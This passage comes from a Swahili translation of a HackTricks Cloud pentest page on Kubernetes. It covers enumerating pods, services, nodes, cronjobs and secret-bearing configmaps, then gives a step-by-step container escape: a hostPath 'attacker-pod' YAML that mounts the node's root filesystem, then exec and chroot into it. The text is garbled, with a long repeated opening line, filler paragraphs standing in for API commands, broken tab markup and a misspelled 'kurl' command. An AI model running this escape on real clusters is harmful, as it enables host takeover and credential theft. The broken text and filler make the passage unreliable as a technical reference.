- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya kikundi cha kuhifadhi
- Majina ya mipangilio ya k
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Pata Huduma

**Huduma za Kubernetes** hutumiwa kwa **kufunua huduma katika bandari na IP maalum** (ambayo itafanya kazi kama balansa ya mzigo kwa makodipo ambayo kimsingi yanatoa huduma). Hii ni muhimu kujua mahali unaweza kupata huduma zingine kujaribu kushambulia.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 
### Uchunguzi wa Kubernetes

#### Kuchunguza API Server

Kuanza, tunaweza kutumia amri ifuatayo kuchunguza API server:

```bash
kubectl get --raw /
```

Hii itatoa majibu ya API server kwa muundo wa JSON. Tunaweza pia kutumia amri hii kuchunguza sehemu maalum ya API server:

```bash
kubectl get --raw /api/v1
```

#### Kuchunguza Rasilimali za Kubernetes

Tunaweza kutumia amri ifuatayo kuchunguza rasilimali zilizopo kwenye kikasha cha Kubernetes:

```bash
kubectl get pods
kubectl get deployments
kubectl get services
```

Hii itatoa orodha ya pods, deployments, na services zilizopo kwenye kikasha cha Kubernetes.

#### Kuchunguza Mazingira ya Kikasha

Tunaweza kutumia amri ifuatayo kuchunguza mazingira ya kikasha cha Kubernetes:

```bash
kubectl describe pods
kubectl describe nodes
kubectl describe namespaces
```

Hii itatoa maelezo ya kina kuhusu pods, nodes, na namespaces zilizopo kwenye kikasha cha Kubernetes.
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Pata nodes

Pata **nodes zote zilizoconfigure ndani ya cluster**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API za Kubernetes kunaweza kufunua habari muhimu kuhusu mazingira ya kifaa. Unaweza kutumia zana kama `kubectl` au `kube-api` kufanya uchunguzi huu. Kwa mfano, unaweza kupata habari kuhusu majina ya vikundi vya rasilimali, majina ya majina, na hata vibali vya kikundi. Kwa kufanya hivyo, unaweza kupata ufikiaji wa rasilimali muhimu au hata kufikia udhibiti wa kifaa. Kwa hivyo, ni muhimu kufanya uchambuzi wa kina wa API za Kubernetes ili kugundua mapungufu yoyote ya usalama. 
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Pata DaemonSets

**DaeamonSets** inaruhusu kuhakikisha kwamba pod **maalum inaendeshwa kwenye nodes zote** za kikundi (au kwenye zile zilizochaguliwa). Ikiwa unafuta DaemonSet podi zinazosimamiwa nayo pia zitaondolewa.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API kwa kutumia mbinu za uchambuzi wa kawaida kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo kwenye kikundi cha Kubernetes. Mbinu hizi zinaweza kujumuisha kutumia amri za `curl` au zana zingine za uchunguzi wa API kuchunguza endpoini za API zinazopatikana. Kwa mfano, unaweza kutumia amri ifuatayo ya `curl` kuchunguza rasilimali za `pods` kwenye kikundi cha Kubernetes:

```bash
curl https://<kubernetes-api-server>/api/v1/namespaces/default/pods
```

Kumbuka kubadilisha `<kubernetes-api-server>` na anwani sahihi ya seva ya API ya Kubernetes. Kwa kufanya hivyo, unaweza kupata habari muhimu kama majina ya podi, vitambulisho, na maelezo mengine yanayohusiana na rasilimali za kikundi cha Kubernetes. Kwa kuchambua habari hii, unaweza kugundua maelezo muhimu kwa ajili ya hatua zaidi za uchambuzi au mashambulizi. 
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Pata kazi ya cron

Kazi za Cron huruhusu kupanga kutumia sintaksia ya crontab uzinduzi wa kisanduku ambacho kitatekeleza kitendo fulani.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API kwenye mazingira ya Kubernetes kunaweza kufunua habari muhimu kuhusu rasilimali zilizopo na mifumo ya kuhifadhi data. Kwa kutumia zana kama `kubectl` au kufanya ombi la HTTP moja kwa moja, unaweza kupata ufikiaji wa API na kuchunguza rasilimali zilizopo, kama vile Pods, Services, na ConfigMaps. Kwa kufanya hivyo, unaweza kugundua mianya ya usalama au habari muhimu inayoweza kutumiwa kwa mashambulizi zaidi. 

Kwa mfano, unaweza kutumia amri kama `kubectl get pods` au `kubectl get services` kuchunguza rasilimali zilizopo kwenye kikasha cha Kubernetes. Pia, unaweza kutumia amri za kuchunguza kama `curl` au `wget` kufanya ombi la HTTP moja kwa moja kwenye API ya Kubernetes. Kwa njia hii, unaweza kuchunguza mifumo ya kuhifadhi data kama ConfigMaps au Secrets ambazo zinaweza kuwa na habari nyeti. 

Ni muhimu kufanya uchambuzi wa kina wa API ili kugundua mianya yoyote ya usalama na kuchukua hatua za kurekebisha mapema kabla ya kutokea kwa shambulizi. 
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Pata configMap

configMap mara nyingi ina habari nyingi na faili za mazingira ambazo hutoa kwa programu zinazotumika kwenye kubernetes. Kawaida unaweza kupata nywila nyingi, siri, na vitambulisho vinavyotumiwa kuunganisha na kuthibitisha huduma nyingine za ndani/za nje.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 
### Uchambuzi wa API

Kuchunguza API kwa kutumia zana kama `kube-hunter` inaweza kusaidia kugundua hatari zinazowezekana. Zana hii inaweza kufanya uchunguzi wa kina wa mazingira ya Kubernetes na kutoa ripoti juu ya udhaifu uliogunduliwa. Kwa kuchambua API, unaweza kugundua maelezo muhimu kama majina ya huduma, mipangilio ya usalama, na maelezo mengine yanayoweza kusababisha hatari. 

Kwa mfano, unaweza kutumia zana kama `kubectl` kuchunguza maelezo ya huduma na vifaa vya kuhifadhi vilivyopo kwenye kikundi cha Kubernetes. Kwa kufanya hivyo, unaweza kugundua maelezo yanayoweza kusaidia katika kubaini udhaifu na kufanya marekebisho sahihi ya usalama. 
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Pata "zote"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pata Matumizi ya Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Kutoroka kutoka kwa kisanduku

Ikiwa unaweza kuunda sanduku mpya unaweza kutoroka kutoka kwake kwenda kwenye kifaa. Ili kufanya hivyo unahitaji kuunda sanduku jipya kwa kutumia faili ya yaml, kubadilisha kwenye sanduku lililoundwa na kisha chroot ndani ya mfumo wa kifaa. Unaweza kutumia mifano ya sanduku iliyopo kama kumbukumbu kwa faili ya yaml kwani huonyesha picha na njia zilizopo.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> if you need create pod on the specific node, you can use following command to get labels on node
>
> `k get nodes --show-labels`
>
> Commonly, kubernetes.io/hostname and node-role.kubernetes.io/master are all good label for select.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Kisha unaweza kuunda faili yako ya attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[chanzo cha yaml kilichobadilishwa](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Baada ya hapo unajenga podi
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Sasa unaweza kubadilisha kwenye podi iliyoumbwa kama ifuatavyo
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Na mwishowe unachroot ndani ya mfumo wa node
```bash
chroot /root /bin/bash
```
Maelezo yaliyopatikana kutoka: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Sehemu ya 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Kushambulia na Kujilinda Kubernetes: Bust-A-Kube ‚Äì Kipindi cha 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Marejeo

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Jifunze & jifanye Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & jifanye Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
